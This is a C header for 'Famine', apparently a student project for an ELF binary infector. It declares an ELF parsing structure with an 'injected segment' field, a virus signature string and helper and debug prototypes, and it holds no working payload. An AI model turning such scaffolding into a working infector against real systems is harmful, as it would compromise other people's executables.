#ifndef FAMINE_H
# define FAMINE_H

#define _GNU_SOURCE

# include <dirent.h>
# include <elf.h>
# include <errno.h>
# include <fcntl.h>
# include <libgen.h>
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <sys/mman.h>
# include <unistd.h>

# define SIGNATURE "Famine version 1.0 (c)oded by lmartin"

# define PAGE_SIZE 0x1000

# define CORRUPTED_FILE -1

typedef struct		s_elf
{
	char			*filename;
	void			*addr;
	long			size;
	Elf64_Ehdr		*header;
	Elf64_Phdr		*segments;
	Elf64_Shdr		*sections;
	Elf64_Phdr		*pt_load; /* injected segment */
	Elf64_Shdr		*text_section;
}					t_elf;

/* elf.c */
int			init_elf(t_elf *elf, void *addr, long size);
int			check_magic_elf(void *addr);

/* utils.c */
void	*ft_memmem(const void *l, size_t l_len, const void *s, size_t s_len);

/* DEBUG */

# define _RED		"\e[31m"
# define _GREEN		"\e[32m"
# define _YELLOW	"\e[33m"
# define _BLUE		"\e[34m"
# define _END		"\e[0m"

# ifndef DEBUG
#  define DEBUG 0
# endif

/* debug.c */
void	debug_print_error(int code, char *prg, char *input);
void	debug_print_elf(t_elf *elf);
void	debug_print_args(int argc, char *argv[]);

#endif
